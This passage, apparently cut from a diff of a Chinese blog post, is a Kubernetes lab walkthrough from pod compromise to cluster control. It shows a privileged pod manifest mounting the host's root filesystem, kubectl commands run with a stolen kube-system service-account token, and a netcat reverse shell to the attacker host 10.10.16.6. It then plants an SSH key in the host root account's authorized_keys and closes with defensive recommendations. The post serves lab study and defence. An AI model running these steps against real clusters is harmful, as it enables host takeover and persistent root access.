class="string">alpine</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">evilpod</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">localhost:5000/dev-alpine</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>]</span><br><span class="line">    <span class="attr">args:</span> [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sleep 300000&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">hostfs</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hostfs</span></span><br><span class="line">    <span class="attr">hostPath:</span>  </span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">automountServiceAccountToken:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.6:8089/evilpod.yaml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">kubectl</span> <span class="string">apply</span> <span class="string">-f</span> <span class="string">evilpod.yaml</span>  <span class="string">--token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow</span></span><br></pre></td></tr></table></figure>
+<p>进入这个pod</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> alpine --stdin --<span class="built_in">tty</span> -n kube-system --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow -- /bin/sh</span><br></pre></td></tr></table></figure>
+<p>有时候pod会被干掉</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods   --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow  -A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/03/09/FP9CaBtV6EbAxGe.png" alt="查看自己创建pod的运行状态.png"></p>
+<p>nc  10.10.16.6 6666 -e &#x2F;bin&#x2F;sh<br />不过后面测试发现其实是有nc的<br /></p>
+<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>本地生成一个密钥对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh-keygen -t rsa</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDL6xrC835Szv07Z+vdc8aD/LpgAqLs2V/7lrRnpg6SR4FggpYsKemVeUnUhXYXjwqFdkqJF7Dc88uNl1vxMsOCLiO3cRTJrzRjiolDSVZBpYcfFt44mwQbjsxHiCW3mY8zzp7UQEy55zXEbrzEgkw1T+8EJOYQ4ozS8n8XFgk90uyM7Hl8qEzYPJVpU/vmpRP04UFeaSo75gxZSCIW7Nj6eL5gE6a0qzD1aUO6HpiMvElCEHHF7aK5T2jkTevizRbZ4PAYxe0AeJvWWvlqjIoa2j/1TEcz9EKSzRgUNP9gkQfEh0XNKeQA/M02bPnYrUDlnOuqLpwMYwNB/O+o6Ci0JYDFB1zMSrJu3/gbOXGIn4tLHUPUGnu3kW01JksA2iawR9bHq9lssdUAUwpPjRsfvkQiI54639N/b9ArHsJwMGZVnh7DIlgosqW690Swl7VdNElGiaN80R9IxGvLyIHCmG2yhkPio2d0zT9OxXhKPU1uV9A53E1WPe9YE2gXQF8= root@no</span><br></pre></td></tr></table></figure>
+<p>在POD里上传写入公钥，本质就是写到了宿主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /mnt/root</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/root/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 700 /mnt/root/.ssh</span><br><span class="line"><span class="built_in">echo</span>  <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDL6xrC835Szv07Z+vdc8aD/LpgAqLs2V/7lrRnpg6SR4FggpYsKemVeUnUhXYXjwqFdkqJF7Dc88uNl1vxMsOCLiO3cRTJrzRjiolDSVZBpYcfFt44mwQbjsxHiCW3mY8zzp7UQEy55zXEbrzEgkw1T+8EJOYQ4ozS8n8XFgk90uyM7Hl8qEzYPJVpU/vmpRP04UFeaSo75gxZSCIW7Nj6eL5gE6a0qzD1aUO6HpiMvElCEHHF7aK5T2jkTevizRbZ4PAYxe0AeJvWWvlqjIoa2j/1TEcz9EKSzRgUNP9gkQfEh0XNKeQA/M02bPnYrUDlnOuqLpwMYwNB/O+o6Ci0JYDFB1zMSrJu3/gbOXGIn4tLHUPUGnu3kW01JksA2iawR9bHq9lssdUAUwpPjRsfvkQiI54639N/b9ArHsJwMGZVnh7DIlgosqW690Swl7VdNElGiaN80R9IxGvLyIHCmG2yhkPio2d0zT9OxXhKPU1uV9A53E1WPe9YE2gXQF8= root@no&quot;</span>  &gt; /mnt/root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 /mnt/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p>然后用私钥登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa root@10.10.10.235</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/IAnLbazgWVUM45t.png" alt="密钥登录.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如下是一个典型的K8S应用测试路径<br /><img src="https://s2.loli.net/2022/03/10/aI3pi8g9lKzqm2R.png" alt="典型的K8S的应用测试路径.png"></p>
+<p>在这个靶机里主要是从一个pod横向到另一个pod，再借助pod的serviceaccunt执行kubectl 进而控制集群，通过控制集群挂载敏感主机敏感目录实现提权。<br /><img src="https://s2.loli.net/2022/03/10/6v31ReKaWtZqmzp.png" alt="K8S组件关系.png"></p>
+<h1 id="防御锚点"><a href="#防御锚点" class="headerlink" title="防御锚点"></a>防御锚点</h1><p>从防御者的角度出发，做出以下思考</p>
+<p>事前</p>
+<ul>
+<li>安全左移 ：省略的前期中主要依靠的就是旧&#x2F;不维护版本的安全问题，如果在开发前期集成进行管控，也可以扼杀攻击者入口（比如SCA、ISAT、微服务安全相关技术的使用）</li>
+<li>容器功能最小化：比如不要给POD不需要的serviceaccout权限</li>
+<li>传统安全设备：比如WAF&#x2F;防火墙&#x2F;全流量设备等也可以产生一定作用</li>
+</ul>
+<p>事中</p>
+<ul>
+<li>K8S运行时检测：异常的shell命令执行（POD信息收集）、敏感目录挂载、kubectl文件、cdk等容器渗透工具（目前还较少）。</li>
+<li>集群内外关系、资产可视化展示：确定目前的影响面</li>
+<li>微隔离能力：对安全事件进行响应</li>
+</ul>
+<p>事后</p>
+<ul>
+<li>K8S各项日志采集：回溯攻击者攻击路径，形成预测、防御、检测、响应闭环</li>
+</ul>
+<p>但是不同企业的二开K8S怎么防御就不好说了，就目前来看常见安全设备对CRI是docker的支持较好。</p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>验证一些猜想，确认一下服务，可以看到确实是这样，一个webapp-service 的service </p>
+<p><img src="https://s2.loli.net/2022/03/09/YcRh2PLOJ3NEl9x.png" alt="查看service .png"></p>
+<p>服务的endpoint也是刚才的几个pod，这里pod死过，所以ip换了<br><img src="https://s2.loli.net/2022/03/09/n63IwKDm5AfSQZr.png" alt="查看endpoint.png"><br>查看deployment<br><img src="https://s2.loli.net/2022/03/09/LEHZwPsBqA3uxnr.png" alt="查看deployment.png"><br>包括之前扫描出的一些端口服务也就很明晰了<br><img src="https://s2.loli.net/2022/03/09/qgvkOxul1ts3coU.png" alt="宿主机开放的端口.png"><br>查看本地的一些镜像</p>
+<p>尝试拉取镜像，这里是不通外网的</p>
+<p>因为使用的是本地仓库<br><img src="https://s2.loli.net/2022/03/09/SP9UxFcQ1sfY67H.png" alt="使用的本地仓库.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex-null</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://alex-null.github.io/2021/12/01/%E6%B5%85%E8%B0%88K8S%E6%94%BB%E9%98%B2%EF%BC%9A%E4%BB%8EPOD%E5%88%B0%E6%8E%A7%E5%88%B6%E9%9B%86%E7%BE%A4/">https://alex-null.github.io/2021/12/01/%E6%B5%85%E8%B0%88K8S%E6%94%BB%E9%98%B2%EF%BC%9A%E4%BB%8EPOD%E5%88%B0%E6%8E%A7%E5%88%B6%E9%9B%86%E7%BE%A4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://alex-null.github.io" target="_blank">Alex-null's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2022/03/07/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5%E4%B8%8E%E5%93%8D%E5%BA%94/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">容器安全事件排查与响应</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/03/08/FKDTEeyRA8c4vt6.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Alex-null</div><div class="author-info__description">安全知识~</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a id="card-info-btn" href="https://alex-null.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">自留地</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.1.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">持久化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E9%94%9A%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">防御锚点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">5.</span> <span class="toc-text">其他</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/08/naabu%E5%BC%80%E5%8F%91%E5%88%86%E6%94%AF%E5%AE%B9%E5%99%A8%E5%8C%96%E7%BC%96%E8%AF%91/" title="naabu开发分支容器化编译">naabu开发分支容器化编译</a><time datetime="2022-03-08T14:35:46.000Z" title="发表于 2022-03-08 22:35:46">2022-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/07/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5%E4%B8%8E%E5%93%8D%E5%BA%94/" title="容器安全事件排查与响应">容器安全事件排查与响应</a><time datetime="2022-03-07T08:18:48.000Z" title="发表于 2022-03-07 16:18:48">2022-03-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/12/01/%E6%B5%85%E8%B0%88K8S%E6%94%BB%E9%98%B2%EF%BC%9A%E4%BB%8EPOD%E5%88%B0%E6%8E%A7%E5%88%B6%E9%9B%86%E7%BE%A4/" title="浅谈K8S攻防：从POD到控制集群">浅谈K8S攻防：从POD到控制集群</a><time datetime="2021-11-30T16:11:56.000Z" title="发表于 2021-12-01 00:11:56">2021-12-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Alex-null</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
